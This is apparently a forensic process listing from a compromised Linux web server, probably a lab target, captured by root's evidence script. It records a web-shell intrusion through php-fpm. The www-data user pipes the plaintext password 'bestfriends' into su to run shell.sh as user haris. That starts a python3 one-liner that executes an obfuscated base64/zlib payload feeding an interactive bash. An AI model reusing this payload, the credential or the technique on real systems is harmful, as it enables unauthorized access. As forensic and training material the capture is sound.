+syslog       958  0.0  0.1 222508  6036 ?        Ssl  03:31   0:00 /usr/sbin/rsyslogd -n -iNONE LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify LISTEN_PID=958 LISTEN_FDS=1 LISTEN_FDNAMES=syslog.socket USER=root INVOCATION_ID=fcd48021bf62493899b2955d83cb3b63 JOURNAL_STREAM=8:9634 SYSTEMD_EXEC_PID=958 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/rsyslog.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root        1108  0.0  0.3 392032 12724 ?        Ssl  03:31   0:00 /usr/sbin/ModemManager LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root LOGNAME=root HOME=/root SHELL=/usr/bin/bash INVOCATION_ID=6ea6a6e979b343b2a56f74d1df5e5b5c JOURNAL_STREAM=8:10710 SYSTEMD_EXEC_PID=1108 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/ModemManager.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root        1528  0.0  0.3 1238736 15920 ?       Ssl  03:31   0:00 /usr/local/bin/OliveTin LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=83bebb4717484baa867de42553795762 JOURNAL_STREAM=8:12179 SYSTEMD_EXEC_PID=1528 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/OliveTin.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root        1533  0.0  0.1   8544  4580 ?        Ss   03:31   0:00 /usr/sbin/dovecot -F
+dovecot     1566  0.0  0.0   5024  3036 ?        S    03:31   0:00  \_ dovecot/anvil
+root        1567  0.0  0.0   5164  3188 ?        S    03:31   0:00  \_ dovecot/log
+root        1572  0.0  0.1   7696  4924 ?        S    03:31   0:00  \_ dovecot/config
+dovecot     2652  0.0  0.0   6136  3568 ?        S    06:02   0:00  \_ dovecot/stats
+dovecot     2653  0.0  0.1   6484  4508 ?        S    06:02   0:00  \_ dovecot/auth
+root        6380  1.3  0.1   7972  5724 ?        S    09:01   0:00  \_ dovecot/auth -w
+root        1549  0.0  0.0   6824  2856 ?        Ss   03:31   0:00 /usr/sbin/cron -f -P LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=39ee8ee41d5b4f19badd9a90ff149c7a JOURNAL_STREAM=8:12301 SYSTEMD_EXEC_PID=1549 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/cron.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root        1551  0.0  0.0   3008  2360 ?        Ss   03:31   0:00 /usr/sbin/rpc.idmapd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=5ab476e03d5141b1905dfee364ccc135 JOURNAL_STREAM=8:12248 SYSTEMD_EXEC_PID=1535 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/nfs-idmapd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root        1552  0.0  0.8 233244 33672 ?        Ss   03:31   0:02 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)
+www-data    3011  0.0  1.2 234416 48476 ?        S    06:41   0:03  \_ php-fpm: pool www
+www-data    3172  0.0  0.0   2800  1816 ?        S    06:56   0:00  |   \_ sh -c -- ping 10.10.16.156 USER=www-data HOME=/var/www
+www-data    3173  0.0  0.0   4656  2204 ?        S    06:56   0:01  |       \_ ping 10.10.16.156 USER=www-data HOME=/var/www PWD=/var/www/html/openstamanager/files
+www-data    3017  0.0  1.2 234416 48824 ?        S    06:42   0:06  \_ php-fpm: pool www
+www-data    6241  0.0  0.0   2800  1876 ?        S    08:52   0:00  |   \_ sh -c -- echo 'bestfriends' | su - haris -c 'bash shell.sh' USER=www-data HOME=/var/www
+root        6243  0.0  0.1   6776  4588 ?        S    08:52   0:00  |       \_ su - haris -c bash shell.sh USER=www-data HOME=/var/www PWD=/var/www/html/openstamanager/files
+haris       6259  0.0  0.0   7340  3624 ?        Ss   08:52   0:00  |           \_ bash shell.sh SHELL=/bin/bash PWD=/home/haris LOGNAME=haris XDG_SESSION_TYPE=unspecified HOME=/home/haris LANG=en_US.UTF-8 XDG_SESSION_CLASS=background USER=haris SHLVL=0 XDG_SESSION_ID=c106 XDG_RUNTIME_DIR=/run/user/1000 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin MAIL=/var/mail/haris _=/usr/bin/bash
+haris       6261  0.0  0.0   7340  3644 ?        S    08:52   0:00  |               \_ /usr/bin/bash MAIL=/var/mail/haris USER=haris XDG_SESSION_TYPE=unspecified SHLVL=1 HOME=/home/haris LOGNAME=haris _=tSFlqgJgVrMwRVbrZoRL XDG_SESSION_CLASS=background XDG_SESSION_ID=c106 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin XDG_RUNTIME_DIR=/run/user/1000 LANG=en_US.UTF-8 SHELL=/bin/bash PWD=/home/haris XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+haris       6289  0.0  0.3  20176 12880 ?        S    08:52   0:00  |                   \_ /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("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"))) SHELL=/usr/bin/bash PWD=/home/haris LOGNAME=haris XDG_SESSION_TYPE=unspecified HOME=/home/haris LANG=en_US.UTF-8 XDG_SESSION_CLASS=background TERM=xterm-256color USER=haris SHLVL=2 XDG_SESSION_ID=c106 XDG_RUNTIME_DIR=/run/user/1000 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin MAIL=/var/mail/haris _=/usr/bin/python3
+haris       6290  0.0  0.1   8668  5644 pts/0    Ss+  08:52   0:00  |                       \_ /usr/bin/bash -i SHELL=/usr/bin/bash PWD=/home/haris LOGNAME=haris XDG_SESSION_TYPE=unspecified HOME=/home/haris LANG=en_US.UTF-8 XDG_SESSION_CLASS=background TERM=xterm-256color USER=haris SHLVL=2 XDG_SESSION_ID=c106 XDG_RUNTIME_DIR=/run/user/1000 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin MAIL=/var/mail/haris _=/usr/bin/python3
+www-data    3018  0.0  1.2 234416 48712 ?        S    06:42   0:05  \_ php-fpm: pool www
+www-data    6360  0.0  1.0 234216 41364 ?        S    08:57   0:00  \_ php-fpm: pool www
+root        1557  0.0  0.0  43212  1916 ?        Ss   03:31   0:00 /usr/sbin/rpc.mountd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=26caf83e77f24945af2b1ea96ac1e8db JOURNAL_STREAM=8:12249 SYSTEMD_EXEC_PID=1537 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/nfs-mountd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+statd       1562  0.0  0.0   4560  2036 ?        Ss   03:31   0:00 /usr/sbin/rpc.statd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin PIDFILE=/run/rpc.statd.pid USER=root INVOCATION_ID=a17306899c43432e832c9d20140bab87 JOURNAL_STREAM=8:12401 SYSTEMD_EXEC_PID=1554 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/rpc-statd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= RPC_STATD_NO_NOTIFY=1
+root        1583  0.0  0.0  11296  1860 ?        Ss   03:32   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; n; master_process on;
+www-data    1587  0.0  0.1  13276  5892 ?        S    03:32   0:00  \_ nginx: worker process
+www-data    1588  0.0  0.1  13404  6036 ?        S    03:32   0:00  \_ nginx: worker process
+root        1608  0.0  0.0   6104  1996 tty1     Ss+  03:32   0:00 /sbin/agetty -o -p -- \u --noclear - linux PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=31a19456a5d748238fe9932ae0c7a5aa TERM=linux CREDENTIALS_DIRECTORY=/run/credentials/getty@tty1.service SYSTEMD_EXEC_PID=1608 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/system-getty.slice/getty@tty1.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+mysql       1630  1.4 12.0 1788640 483364 ?      Ssl  03:32   4:44 /usr/sbin/mysqld LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify USER=mysql LOGNAME=mysql HOME=/nonexistent INVOCATION_ID=560bacfd178b41c39c7e36c1b33d8507 JOURNAL_STREAM=8:12918 RUNTIME_DIRECTORY=/run/mysqld SYSTEMD_EXEC_PID=1630 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/mysql.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= MYSQLD_PARENT_PID=1
+root        1920  0.0  0.1  42856  4916 ?        Ss   03:32   0:00 /usr/lib/postfix/sbin/master -w manpage_directory=/usr/share/man queue_directory=/var/spool/postfix command_directory=/usr/sbin data_directory=/var/lib/postfix mail_owner=postfix meta_directory=/etc/postfix OLDPWD=/etc/postfix sample_directory=/etc/postfix sendmail_path=/usr/sbin/sendmail setgid_group=postdrop readme_directory=no config_directory=/etc/postfix shlib_directory=/usr/lib/postfix html_directory=/usr/share/doc/postfix/html PATH=/bin:/usr/bin:/sbin:/usr/sbin LANG=C MAIL_CONFIG=/etc/postfix daemon_directory=/usr/lib/postfix/sbin mailq_path=/usr/bin/mailq PWD=/var/spool/postfix MAIL_LOGTAG=postfix newaliases_path=/usr/bin/newaliases
+postfix     1922  0.0  0.1  43344  7908 ?        S    03:32   0:00  \_ qmgr -l -t unix -u MAIL_CONFIG=/etc/postfix MAIL_LOGTAG=postfix LANG=C GENERATION=2
+postfix     5250  0.0  0.1  43304  7852 ?        S    08:31   0:00  \_ pickup -l -t unix -u -c MAIL_CONFIG=/etc/postfix MAIL_LOGTAG=postfix LANG=C GENERATION=10
+root        1997  0.0  1.1 614520 45136 ?        Ssl  03:37   0:02 /usr/libexec/fwupd/fwupd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=6b0ff836167b4eef9f537d1416d27bed JOURNAL_STREAM=8:15097 RUNTIME_DIRECTORY=/run/motd.d STATE_DIRECTORY=/var/lib/fwupd CACHE_DIRECTORY=/var/cache/fwupd CONFIGURATION_DIRECTORY=/etc/fwupd SYSTEMD_EXEC_PID=1997 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/fwupd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= GLIBC_TUNABLES=glibc.cpu.hwcaps=SHSTK FWUPD_SYSCALL_FILTER=systemd
+root        2005  0.0  0.2 313832  8812 ?        Ssl  03:37   0:00 /usr/libexec/upowerd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=6c93b5e79a9844bf93e8040deb9f3ed7 JOURNAL_STREAM=8:15131 STATE_DIRECTORY=/var/lib/upower SYSTEMD_EXEC_PID=2005 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/upower.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root        3496  0.0  0.2  12024  8236 ?        Ss   07:27   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups hd -D [listener] 0 of 10-100 startups                                                                                                                                                                                                                                                                                                                                                                                                                             =
+root        6338  0.0  0.2  13768  9316 ?        Ss   08:56   0:00  \_ sshd: root@pts/1                                                                                                                                                                                                                                                                                                                                                                                                                                                                   =
+root        6340  0.0  0.1   8784  5664 pts/1    Ss   08:57   0:00      \_ -bash LANG=en_US.UTF-8 USER=root LOGNAME=root HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MAIL=/var/mail/root SHELL=/bin/bash TERM=tmux-256color SSH_CLIENT=10.10.16.156 52322 22 SSH_CONNECTION=10.10.16.156 52322 10.129.5.30 22 SSH_TTY=/dev/pts/1
+root        6383  7.6  0.0   7472  3764 pts/1    S+   09:01   0:00          \_ /bin/bash ./evidence.sh SHELL=/bin/bash PWD=/root LOGNAME=root HOME=/root LANG=en_US.UTF-8 LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90: SSH_CONNECTION=10.10.16.156 52322 10.129.5.30 22 LESSCLOSE=/usr/bin/lesspipe %s %s TERM=tmux-256color LESSOPEN=| /usr/bin/lesspipe %s USER=root SHLVL=1 SSH_CLIENT=10.10.16.156 52322 22 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin MAIL=/var/mail/root SSH_TTY=/dev/pts/1 _=./evidence.sh
+root        6418  200  0.1  11012  4584 pts/1    R+   09:01   0:00              \_ ps auxwwef SHELL=/bin/bash PWD=/root LOGNAME=root HOME=/root LANG=en_US.UTF-8 LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90: SSH_CONNECTION=10.10.16.156 52322 10.129.5.30 22 LESSCLOSE=/usr/bin/lesspipe %s %s TERM=tmux-256color LESSOPEN=| /usr/bin/lesspipe %s USER=root SHLVL=2 SSH_CLIENT=10.10.16.156 52322 22 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin MAIL=/var/mail/root SSH_TTY=/dev/pts/1 _=/usr/bin/ps
+haris       6247  0.0  0.2  20168 11140 ?        Ss   08:52   0:00 /usr/lib/systemd/systemd --user LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify USER=haris LOGNAME=haris HOME=/home/haris SHELL=/bin/bash INVOCATION_ID=bbf2569668ae4d44b13756deb23d70ad JOURNAL_STREAM=8:93080 SYSTEMD_EXEC_PID=6247 XDG_RUNTIME_DIR=/run/user/1000
+haris       6248  0.0  0.0  21160  3564 ?        S    08:52   0:00  \_ (sd-pam) biosdevname=0 init=/sbin/init NETWORK_SKIP_ENSLAVED= TERM=linux drop_caps= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PWD=/ rootmnt=/root
